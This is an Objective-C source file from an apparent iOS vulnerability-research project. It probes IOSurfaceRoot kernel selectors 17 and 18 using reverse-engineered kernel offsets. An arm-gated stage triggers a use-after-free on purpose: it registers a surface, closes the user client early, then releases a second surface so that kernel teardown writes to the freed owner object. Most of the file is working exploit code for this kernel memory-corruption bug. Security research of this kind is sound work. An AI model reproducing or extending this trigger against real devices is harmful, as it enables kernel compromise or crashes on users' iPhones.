//
//  P168Iosurface112477.m — 112477 sel-17 classification + arm-gated dangle. p168.
//  2026-11-16.
//
//  Static map (23F77, verified this session):
//    sel-17 handler 0x986cac8 (24-B struct container, 0 scalars,
//      first-arg-gate != 0 -> 0x2c2)
//      -> register 0x986978c: dup-check (node+0x20, node+0x58==client)
//         -> 0x2c9; alloc IOMallocType(DAT_7f35de0); node {next,prev,
//         payload3, +0x50, +0x58 owner} on the registry (client+0xe8)
//         list +0x198 under lock +0x148.
//    sel-18 handler 0x986caf0 -> 0x986988c clean unlink + free.
//    fan-out: surface last-ref teardown 0x9858bc0 -> walker 0x9869984
//      (locks registry+0x148, walks +0x198) -> owner_deref 0x98722dc =
//      sync_take(*(owner+0xd8)) ... sync_release(*(owner+0xd8)).
//    teardown dereg is GATED on client+0xf0 bit0 (set only by init 0x986e0e0);
//      +0xf1 flags ABSENT on 23F77 (byte census).
//  Stage 1-2 fire behavior codes only; kernel writes: NONE. The dangle
//  sequence (register, close before release, then destroy the OTHER surface)
//  runs ONLY with Documents/p168_dangle_arm.txt present.
//

#import "P168Iosurface112477.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>

typedef mach_port_t       io_obj_t;

typedef CFMutableDictionaryRef (*p168_match_t)(const void *);
typedef io_obj_t              (*p168_getsvc_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t         (*p168_open_t)(io_obj_t, mach_port_t, uint32_t,
                                             mach_port_t *);
typedef kern_return_t         (*p168_close_t)(mach_port_t);
typedef kern_return_t         (*p168_struct_t)(mach_port_t, uint32_t,
                                               const void *, uint32_t,
                                               const void *, uint32_t,
                                               void *, uint32_t *,
                                               void *, uint32_t *);
typedef CFTypeRef             (*p168_create_t)(CFDictionaryRef);
typedef uint32_t              (*p168_getid_t)(CFTypeRef);

#define P168_BUILD @"p168-iosurf-112477-v1"

static p168_match_t   sServiceMatching;
static p168_getsvc_t  sGetService;
static p168_open_t    sOpen;
static p168_close_t   sClose;
static p168_struct_t  sStruct;
static p168_create_t  sCreate;
static p168_getid_t   sGetID;

typedef struct { uint64_t a, b, c; } p168_in24_t;

static const char *p168_kIosurfaceRoot = "IOSurfaceRoot";

static BOOL p168_dangleArmed(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES)
                      firstObject];
    return [[NSFileManager defaultManager] fileExistsAtPath:
            [docs stringByAppendingPathComponent:@"p168_dangle_arm.txt"]];
}

static void p168_disk_log(NSString *out) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int fd = open([docs stringByAppendingPathComponent:@"p168_iosurf112477_log.txt"].fileSystemRepresentation,
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *c = out.UTF8String;
        if (c) { write(fd, c, strlen(c)); fcntl(fd, F_FULLFSYNC); }
        close(fd);
    }
}

@implementation P168Iosurface112477

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p168 session %@ BUILD %@ ===\n",
        LabLocalMilitaryNow(), P168_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    [o appendString:@"112477 sel17/18 classification (+ ARM-GATED dangle).\n"];
    [o appendString:@"Static: register 0x986978c / dereg 0x986988c / fan-out\n"];
    [o appendString:@"0x9869984 -> owner_deref 0x98722dc (owner+0xd8).\n"];
    [o appendString:@"PANIC-POSSIBLE only in the ARM-GATED stage. ONE TAP per boot.\n"];

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *d = h ? h : RTLD_DEFAULT;
    sServiceMatching = (p168_match_t)dlsym(d, "IOServiceMatching");
    sGetService      = (p168_getsvc_t)dlsym(d, "IOServiceGetMatchingService");
    sOpen            = (p168_open_t)dlsym(d, "IOServiceOpen");
    sClose           = (p168_close_t)dlsym(d, "IOServiceClose");
    sStruct          = (p168_struct_t)dlsym(d, "IOConnectCallStructMethod");
    sCreate = (p168_create_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
    sGetID  = (p168_getid_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
    [o appendFormat:@"  [lib] iokit=%@ matching=%d getservice=%d open=%d "
                     @"struct=%d surf=%d/%d\n", h ? @"ok" : @"MISSING",
        sServiceMatching != NULL, sGetService != NULL, sOpen != NULL,
        sStruct != NULL, sCreate != NULL, sGetID != NULL];
    if (!sOpen || !sStruct || !sCreate || !sServiceMatching || !sGetService) {
        [o appendString:@"[-] symbols missing — probe dead\n"]; return o;
    }

    /* 1. connect IOSurfaceRoot (master port 0 = default on iOS) */
    CFMutableDictionaryRef m = sServiceMatching(p168_kIosurfaceRoot);
    io_obj_t svc = sGetService(0, m);
    if (m) CFRelease(m);
    mach_port_t conn = 0;
    kern_return_t kr = svc ? sOpen(svc, mach_task_self(), 0, &conn) : 0xe00002eb;
    [o appendFormat:@"  [open] svc=%#x open=%#x conn=%#x\n",
        (unsigned)(uintptr_t)svc, (unsigned)kr, (unsigned)conn];
    if (kr != KERN_SUCCESS || !conn) {
        [o appendString:@"[-] no IOSurfaceRoot UC connect\n"]; return o;
    }

    /* 2. two framework surfaces (real ids for the ladder) */
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        kCFAllocatorDefault, 2, &kCFTypeDictionaryKeyCallBacks,
        &kCFTypeDictionaryValueCallBacks);
    int32_t w = 0x100, hh = 0x100;
    CFNumberRef nw = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &w);
    CFNumberRef nhh = CFNumberCreate(kCFAllocatorDefault, kCFNumberIntType, &hh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nhh);
    CFTypeRef s1 = sCreate(props);
    CFTypeRef s2 = sCreate(props);
    uint32_t id1 = s1 ? sGetID(s1) : 0;
    uint32_t id2 = s2 ? sGetID(s2) : 0;
    [o appendFormat:@"  [surf] s1=%@ id=%u  s2=%@ id=%u\n",
        s1 ? @"ok" : @"fail", id1, s2 ? @"ok" : @"fail", id2];
    CFRelease(nw); CFRelease(nhh);
    if (!s1) { sClose(conn); [o appendString:@"[-] surface create failed\n"]; return o; }

    /* 3. sel-17/-18 classification ladder — 24-B container variants:
          v1 = {id1, 1, id1}   (gate = args qword != 0; id as payload)
          v2 = {id1, id1, 1}
          v3 = {1, 1, 1}       (no id payload; control)                  */
    p168_in24_t v[3] = { {id1, 1, id1}, {id1, id1, 1}, {1, 1, 1} };
    char out[32];
    uint32_t outn;
    uint32_t hit = 0;   /* which variant registered without 2c9/2c2 */
    for (int vi = 0; vi < 3; vi++) {
        outn = sizeof(out);
        kern_return_t r = sStruct(conn, 17, &v[vi], sizeof(p168_in24_t),
                                  NULL, 0, out, (void *)&outn, 0, &outn);
        [o appendFormat:@"  [17 v%d] {a=%llu b=%llu c=%llu} kr=%#x\n",
            vi + 1, (unsigned long long)v[vi].a, (unsigned long long)v[vi].b,
            (unsigned long long)v[vi].c, (unsigned)r];
        if (r == 0xe00002c2 || r == 0xe00002c9) continue;   /* gate / dup */
        if (r != KERN_SUCCESS) continue;
        hit = (uint32_t)vi + 1;
        outn = sizeof(out);
        r = sStruct(conn, 17, &v[vi], sizeof(p168_in24_t),
                    NULL, 0, out, (void *)&outn, 0, &outn);
        [o appendFormat:@"  [17 v%d dup] kr=%#x (2c9 = dup-check HIT; 0 = second node)\n",
            vi + 1, (unsigned)r];
        outn = sizeof(out);
        r = sStruct(conn, 18, &v[vi], sizeof(p168_in24_t),
                    NULL, 0, out, (void *)&outn, 0, &outn);
        [o appendFormat:@"  [18 v%d] kr=%#x (0 = unlinked)\n", vi + 1, (unsigned)r];
        outn = sizeof(out);
        r = sStruct(conn, 18, &v[vi], sizeof(p168_in24_t),
                    NULL, 0, out, (void *)&outn, 0, &outn);
        [o appendFormat:@"  [18 v%d again] kr=%#x (2c2-class = already gone)\n",
            vi + 1, (unsigned)r];
        break;
    }
    if (!hit) [o appendString:@"  [res] no variant registered — struct shapes inconclusive; "
                               "ladder logged\n"];

    /* 4. ARM-GATED dangle stage */
    BOOL armed = p168_dangleArmed();
    if (!armed) {
        [o appendString:@"  [arm] p168_dangle_arm.txt ABSENT — dangle stage SKIPPED\n"
                         "[*] arm = create Documents/p168_dangle_arm.txt, fresh boot, ONE tap\n"];
    } else if (!s2 || !sClose) {
        [o appendString:@"  [arm] missing prereq — skipped\n"];
    } else {
        [o appendFormat:@"  [ARM] dangle sequence (PANIC-POSSIBLE): register s1 (id=%u)\n",
            id1];
        p168_in24_t reg = { id1, 1, id1 };
        outn = sizeof(out);
        kr = sStruct(conn, 17, &reg, sizeof(reg), NULL, 0, out, (void *)&outn, 0, &outn);
        [o appendFormat:@"      reg kr=%#x\n", (unsigned)kr];
        [o appendString:@"      -> IOServiceClose BEFORE CFRelease (the client frees\n"
                         "         while its node stays on the registry list)\n"];
        kr = sClose(conn);
        [o appendFormat:@"      IOServiceClose kr=%#x\n", (unsigned)kr];
        [o appendString:@"      -> destroy the OTHER surface (s2): its teardown runs the\n"
                         "         global fan-out (0x9869984) and derefs the freed owner\n"
                         "         at +0xd8 (sync_take/release = free-object WRITE)\n"];
        CFRelease(s2);
        [o appendString:@"      s2 released. Still running = fan-out survived the freed\n"
                         "      owner (log it honestly — the deref may not fire per-boot).\n"];
    }

    /* cleanup */
    if (s2 && !armed) CFRelease(s2);
    if (s1 && !armed) CFRelease(s1);
    if (sClose) sClose(conn);
    [o appendString:@"=== p168 done (one tap per boot) ===\n"];
    p168_disk_log(o);
    return o;
}

@end
